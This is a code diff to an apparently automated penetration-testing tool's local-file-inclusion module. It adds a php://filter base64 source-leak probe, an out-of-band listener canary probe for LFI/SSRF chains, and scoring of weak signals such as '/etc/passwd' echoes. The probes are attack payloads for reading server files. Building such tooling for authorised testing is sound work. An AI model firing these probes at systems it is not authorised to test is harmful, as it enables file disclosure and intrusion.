@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import asyncio
 import logging
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -131,11 +132,35 @@ class LfiSpecialist(AsyncSpecialist):
        set is exhausted without a verified hit and a ``llm_client`` is
        wired up, :class:`PayloadMutator` is asked for up to three extra
        candidates which are then fired with the same marker check.
-    4. **OOB (php://input, file:// OOB-host for RCE-chain).** Next session.
-    5. **Candidate emission and finalization.** Next session.
+    4. **OOB probing.** Two best-effort probes:
+
+       * ``php://filter/convert.base64-encode/resource=<name>`` — a leaked
+         base64 block that decodes to PHP code confirms a
+         ``lfi_code_leak_php`` disclosure. Skipped silently on non-PHP
+         targets (no code leak = not verified here).
+       * ``file://`` /HTTP against a shared :class:`OobListener` URL — an
+         inbound hit on the listener proves an LFI/SSRF chain
+         (``lfi_ssrf_chain``). Skipped when no listener is wired or it is
+         not running.
+    5. **Candidate finalization.** When phases 2–4 produce no verified
+       hit but phases 2–3 captured partial observations, emits an
+       unverified candidate finding: ``lfi_weak_signal`` (score 3.0) on
+       ``root:`` / ``/etc/passwd`` fragments that fall short of a real
+       passwd line, or ``lfi_size_differential`` (score 2.0) on a very
+       large response body with no markers.
 
     The specialist short-circuits once a verified finding exists and respects
     a local HTTP cap that also bumps the episode's global HTTP counters.
+
+    SAFETY:
+      LFI probes are strictly read-only — no destructive payloads are
+      ever generated or fired. The strong markers in
+      :mod:`penage.specialists.shared.path_traversal` (``root:x:0:0:``,
+      ``[fonts]``, a PHP-code-bearing base64 block, ``/proc`` fragments,
+      access-log lines) are treated as verified disclosure evidence;
+      softer hints (``root:`` without a proper passwd line, a big body
+      without markers) only reach phase 5 as unverified candidates so the
+      validation gate (CLAUDE.md invariant #4) stays intact.
     """
 
     name: ClassVar[str] = "lfi"
@@ -144,19 +169,23 @@ class LfiSpecialist(AsyncSpecialist):
     llm_client: LLMClient | None = None
     memory: MemoryStore | None = None
     tracer: JsonlTracer | None = None
-    oob_listener: OobListener | None = None  # will be used in phase 4
+    oob_listener: OobListener | None = None
 
     payload_library_path: Path = field(default_factory=lambda: _DEFAULT_LIBRARY)
     max_http_budget: int = 30
     max_targets: int = 3
     min_reserve_http: int = 10
     max_deterministic_payloads: int = 8
-    max_bypass_payloads: int = 4  # phase 3, next session
+    max_bypass_payloads: int = 4
+    oob_wait_s: float = 5.0
 
     _done: bool = field(default=False, init=False)
     _attempted: set[str] = field(default_factory=set, init=False)
     _findings: list[dict[str, Any]] = field(default_factory=list, init=False)
     _yaml_cache: list[dict[str, Any]] | None = field(default=None, init=False)
+    _observations: dict[str, list[dict[str, Any]]] = field(
+        default_factory=dict, init=False,
+    )
 
     def propose(self, state: State, *, config: SpecialistConfig) -> List[CandidateAction]:
         _ = (state, config)
@@ -225,26 +254,63 @@ class LfiSpecialist(AsyncSpecialist):
                     self._attempted.add(key)
                     break
 
-            # Phases 4 and 5 are implemented in later sessions (2.6c-iii/iv).
+            # Phase 4 — OOB probes (best-effort).
+            if budgeted.remaining >= 6:
+                self._trace_phase(4, "oob_probing", step=step, target=target)
+                oob_finding = await self._run_oob_phase(
+                    target=target,
+                    http_tool=budgeted,
+                    host=host,
+                    config=config,
+                    step=step,
+                )
+                if oob_finding and oob_finding.get("verified"):
+                    self._findings.append(oob_finding)
+                    self._done = True
+                    self._attempted.add(key)
+                    break
+
+            # Phase 5 — candidate finalization.
+            self._trace_phase(5, "candidate_finalization", step=step, target=target)
+            candidate = self._finalize_candidate(
+                target=target,
+                channel=target.channel,
+                host_status_observations=self._observations.get(key, []),
+            )
+            if candidate is not None:
+                self._findings.append(candidate)
+
             self._attempted.add(key)
 
         return self._emit_if_any()
 
     def _emit_if_any(self) -> List[CandidateAction]:
-        verified = [f for f in self._findings if f.get("verified")]
-        if not verified:
+        if not self._findings:
             return []
-        finding = verified[-1]
+        # Prefer the latest verified finding if any; otherwise fall back to the
+        # latest candidate. Verified always wins over unverified.
+        verified = [f for f in self._findings if f.get("verified")]
+        finding = verified[-1] if verified else self._findings[-1]
+        is_verified = bool(finding.get("verified"))
+        tag = "verified" if is_verified else "unverified"
+        kind = finding.get("kind") or "unknown"
+        family = finding.get("family") or kind
         action = Action(
             type=ActionType.NOTE,
             params={"kind": "lfi_finding", "finding": finding},
-            tags=["lfi", "verified", finding.get("family", "unknown")],
+            tags=["lfi", tag, family],
         )
+        if is_verified:
+            score = 12.0
+        elif kind == "lfi_weak_signal":
+            score = 3.0
+        else:
+            score = 2.0
         return [
             CandidateAction(
                 action=action,
                 source=self.name,
-                score=12.0,
+                score=score,
                 cost=0.0,
                 reason=finding.get("summary") or "LFI finding",
                 metadata={"evidence": finding},
@@ -265,6 +331,7 @@ class LfiSpecialist(AsyncSpecialist):
         Match markers via :func:`detect_lfi_markers`.
         """
         _ = (config, step)
+        obs_key = f"{target.url}|{target.parameter}"
         entries = self._load_yaml_entries(
             categories=("unix", "windows", "absolute"),
             limit=self.max_deterministic_payloads,
@@ -331,6 +398,9 @@ class LfiSpecialist(AsyncSpecialist):
                 payload=payload,
                 outcome="no_signal",
             )
+            self._observations.setdefault(obs_key, []).append(
+                _make_observation(payload, status, body)
+            )
         return None
 
     async def _run_bypass_phase(
@@ -391,6 +461,7 @@ class LfiSpecialist(AsyncSpecialist):
             return 5  # raw — phase 2 already tried plain forms
 
         a_variants_sorted = sorted(set(a_variants), key=_bypass_priority)
+        obs_key = f"{target.url}|{target.parameter}"
 
         b_entries = self._load_yaml_entries(categories=("bypass",), limit=4)
         b_variants = [str(e["payload"]) for e in b_entries]
@@ -476,6 +547,9 @@ class LfiSpecialist(AsyncSpecialist):
                 parameter=target.parameter,
                 payload=payload,
                 outcome="no_signal",
+            )
+            self._observations.setdefault(obs_key, []).append(
+                _make_observation(payload, status, body)
             )
 
         # Deterministic set exhausted without a verified hit — try LLM mutation.
@@ -584,6 +658,9 @@ class LfiSpecialist(AsyncSpecialist):
                 payload=p,
                 outcome="no_signal",
             )
+            self._observations.setdefault(obs_key, []).append(
+                _make_observation(p, status, body)
+            )
 
         self._note(
             f"lfi:bypass_phase_no_verified deterministic_tried={deterministic_tried} "
@@ -600,12 +677,265 @@ class LfiSpecialist(AsyncSpecialist):
         config: SpecialistConfig,
         step: int,
     ) -> dict[str, Any] | None:
-        """Phase 4: OOB via php://input / file:// to an OOB host."""
-        raise NotImplementedError("Implemented in 2.6c")
+        """Phase 4: OOB probes — PHP filter base64 source leak + OOB-listener hit.
 
-    def _finalize_candidate(self, finding: dict[str, Any]) -> CandidateAction | None:
-        """Phase 5: candidate-emit + finalization."""
-        raise NotImplementedError("Implemented in 2.6c")
+        Two best-effort probes. Neither is required; most targets will be
+        non-PHP, and most sandboxed labs will not allow outbound HTTP.
+
+        * **A. ``php://filter/convert.base64-encode/resource=<name>``.** The
+          resource name is derived from ``target.original_value`` with any
+          extension stripped (the filter adds the encoding itself); when
+          the original value is empty we fall back to ``index``. A decoded
+          base64 block that contains PHP tokens (see
+          :func:`detect_lfi_markers`'s ``CODE_LEAK`` branch) is treated as
+          a verified ``lfi_code_leak_php`` finding.
+        * **B. File/URL probe against the shared OOB listener.** When an
+          :class:`OobListener` is wired and running, a fresh canary token
+          is registered and its HTTP URL is injected into the parameter.
+          The probe is sent concurrently with :meth:`OobListener.wait_for_hit`
+          so an inbound request on our listener socket proves the target
+          fetched the URL — an LFI/SSRF chain. Returns an
+          ``lfi_ssrf_chain`` finding. Falls through silently on timeout or
+          listener failures.
+
+        Returns the first verified finding from either probe, otherwise
+        ``None``. A trace note ``lfi:oob_phase_no_verified`` is emitted
+        with which probes were attempted.
+        """
+        _ = (config, step)
+        php_filter_tried = False
+        file_oob_tried = False
+        oob_hit = False
+
+        # ---- Probe A: php://filter base64 source disclosure -----------
+        if http_tool.remaining >= 2:
+            php_filter_tried = True
+            resource = target.original_value or "index"
+            if "." in resource:
+                resource = resource.rsplit(".", 1)[0]
+            if not resource:
+                resource = "index"
+            payload = f"php://filter/convert.base64-encode/resource={resource}"
+
+            probe_url, action_params = _build_probe_action(target, payload)
+            action = Action(type=ActionType.HTTP, params=action_params)
+            obs = await http_tool.run(action)
+
+            if obs.ok and isinstance(obs.data, dict):
+                body = str(obs.data.get("text_full") or "")
+                status = obs.data.get("status_code")
+                hits = detect_lfi_markers(body)
+                code_leak = next(
+                    (h for h in hits if h.family.value == "code_leak"), None
+                )
+                if code_leak is not None:
+                    self._record_attempt(
+                        host=host,
+                        parameter=target.parameter,
+                        payload=payload,
+                        outcome="verified_php_code_leak",
+                    )
+                    return {
+                        "verified": True,
+                        "kind": "lfi_code_leak_php",
+                        "mode": "oob_php_filter",
+                        "parameter": target.parameter,
+                        "payload": payload,
+                        "channel": target.channel,
+                        "url": probe_url,
+                        "family": "code_leak",
+                        "evidence": {
+                            "markers": [
+                                {
+                                    "family": code_leak.family.value,
+                                    "marker": code_leak.marker,
+                                    "snippet": code_leak.snippet,
+                                }
+                            ],
+                            "response_excerpt": body[:500],
+                            "http_status": status,
+                            "bypass_source": "php_filter",
+                        },
+                        "summary": (
+                            f"LFI code disclosure (PHP base64) via "
+                            f"{target.parameter}"
+                        ),
+                    }
+            else:
+                self._record_attempt(
+                    host=host,
+                    parameter=target.parameter,
+                    payload=payload,
+                    outcome="error",
+                )
+
+        # ---- Probe B: OOB-listener file/url hit ------------------------
+        if (
+            self.oob_listener is not None
+            and self.oob_listener.is_running
+            and http_tool.remaining >= 2
+        ):
+            file_oob_tried = True
+            token: str | None = None
+            oob_url: str | None = None
+            try:
+                token, oob_url = await self.oob_listener.register_token()
+            except Exception as exc:  # LEGACY: listener boundary
+                self._note(f"lfi:oob_register_failed {exc}")
+
+            if oob_url is not None:
+                payload = oob_url
+                probe_url, action_params = _build_probe_action(target, payload)
+                action = Action(type=ActionType.HTTP, params=action_params)
+
+                send_task = asyncio.create_task(http_tool.run(action))
+                wait_task = asyncio.create_task(
+                    self.oob_listener.wait_for_hit(token, timeout_s=self.oob_wait_s)
+                )
+                await asyncio.gather(send_task, wait_task, return_exceptions=True)
+                send_obs = send_task.result() if send_task.done() else None
+                hit_result = wait_task.result() if wait_task.done() else None
+                hit = hit_result if not isinstance(hit_result, Exception) else None
+
+                if hit is not None:
+                    oob_hit = True
+                    self._record_attempt(
+                        host=host,
+                        parameter=target.parameter,
+                        payload=payload,
+                        outcome="verified_oob",
+                    )
+                    body_excerpt = ""
+                    if send_obs is not None and send_obs.ok and isinstance(
+                        send_obs.data, dict
+                    ):
+                        body_excerpt = str(
+                            send_obs.data.get("text_full") or ""
+                        )[:300]
+                    return {
+                        "verified": True,
+                        "kind": "lfi_ssrf_chain",
+                        "mode": "oob_file_url",
+                        "parameter": target.parameter,
+                        "payload": payload,
+                        "channel": target.channel,
+                        "url": probe_url,
+                        "family": "code_leak",
+                        "evidence": {
+                            "oob_hit": {
+                                "remote_addr": hit.remote_addr,
+                                "path": hit.path,
+                            },
+                            "response_excerpt": body_excerpt,
+                            "chained_with_ssrf_semantics": True,
+                            "bypass_source": "oob_file_url",
+                        },
+                        "summary": (
+                            f"LFI/SSRF chain via {target.parameter} (OOB hit)"
+                        ),
+                    }
+
+        self._note(
+            f"lfi:oob_phase_no_verified php_filter_tried={php_filter_tried} "
+            f"file_oob_tried={file_oob_tried} oob_hit={oob_hit}"
+        )
+        return None
+
+    def _finalize_candidate(
+        self,
+        *,
+        target: _LfiTarget,
+        channel: str,
+        host_status_observations: list[dict[str, Any]],
+    ) -> dict[str, Any] | None:
+        """Phase 5: assemble a candidate finding from partial phase-2/3 observations.
+
+        ``host_status_observations`` is the list collected under
+        ``self._observations[key]`` across phases 2–3: one entry per probe
+        that produced a benign (``no_signal``) HTTP response, with
+        ``weak_marker`` / ``size_anomaly`` flags.
+
+        Preference order:
+
+        1. ``lfi_weak_signal`` — any observation with a ``root:`` line that
+           is *not* a real passwd line, or a body that mentions
+           ``/etc/passwd`` / ``win.ini`` as strings (likely error output
+           from a blocked include). Score 3.0.
+        2. ``lfi_size_differential`` — a response body over 1500 chars
+           without any strong or weak markers. This can indicate a
+           filter-stripped include that leaked the included source
+           without the usual markers. Score 2.0.
+
+        Returns ``None`` when no observation qualifies — the specialist
+        then emits no candidate for this target.
+        """
+        weak = next(
+            (o for o in host_status_observations if o.get("weak_marker")),
+            None,
+        )
+        if weak is not None:
+            return {
+                "verified": False,
+                "kind": "lfi_weak_signal",
+                "mode": "candidate",
+                "parameter": target.parameter,
+                "payload": weak["payload"],
+                "channel": channel,
+                "url": "",
+                "family": "unknown",
+                "evidence": {
+                    "weak_marker": True,
+                    "response_excerpt": weak["body_excerpt"],
+                    "http_status": weak["status"],
+                },
+                "reason": "partial_marker",
+                "summary": f"Weak LFI signal on {target.parameter}",
+            }
+
+        size_anom = next(
+            (o for o in host_status_observations if o.get("size_anomaly")),
+            None,
+        )
+        if size_anom is not None:
+            return {
+                "verified": False,
+                "kind": "lfi_size_differential",
+                "mode": "candidate",
+                "parameter": target.parameter,
+                "payload": size_anom["payload"],
+                "channel": channel,
+                "url": "",
+                "family": "unknown",
+                "evidence": {
+                    "size_anomaly": True,
+                    "response_excerpt": size_anom["body_excerpt"],
+                    "http_status": size_anom["status"],
+                },
+                "reason": "response_size_anomaly",
+                "summary": f"Size-differential LFI candidate on {target.parameter}",
+            }
+
+        return None
+
+    @staticmethod
+    def _has_weak_marker(body: str) -> bool:
+        """Return True if ``body`` carries a soft LFI signal.
+
+        Weak signals are strings that hint at include-parameter processing
+        without proving a real disclosure: a ``root:`` line that is not a
+        proper passwd entry, or the literal paths ``/etc/passwd`` /
+        ``win.ini`` echoed back (often by error messages from a blocked
+        include). These are explicitly *not* strong enough to mark a
+        finding verified.
+        """
+        if not body:
+            return False
+        low = body.lower()
+        if "root:" in low and "root:x:0:0:" not in low:
+            return True
+        if "/etc/passwd" in low or "win.ini" in low:
+            return True
+        return False
 
     def _discover_targets(self, state: State) -> list[_LfiTarget]:
         targets: list[_LfiTarget] = []
@@ -782,6 +1112,25 @@ def _load_lfi_library(path: Path) -> list[dict[str, Any]]:
             }
         )
     return entries
+
+
+def _make_observation(
+    payload: str, status: Any, body: str
+) -> dict[str, Any]:
+    """Build a phase-2/3 observation record for phase-5 finalization.
+
+    Each observation is a lightweight snapshot of one benign probe:
+    the payload, HTTP status, a short body excerpt, and two boolean
+    hint flags. Phase 5 scans this list to decide whether to emit an
+    unverified candidate.
+    """
+    return {
+        "payload": payload,
+        "status": status,
+        "body_excerpt": body[:300],
+        "weak_marker": LfiSpecialist._has_weak_marker(body),
+        "size_anomaly": len(body) > 1500,
+    }
 
 
 def _build_probe_action(
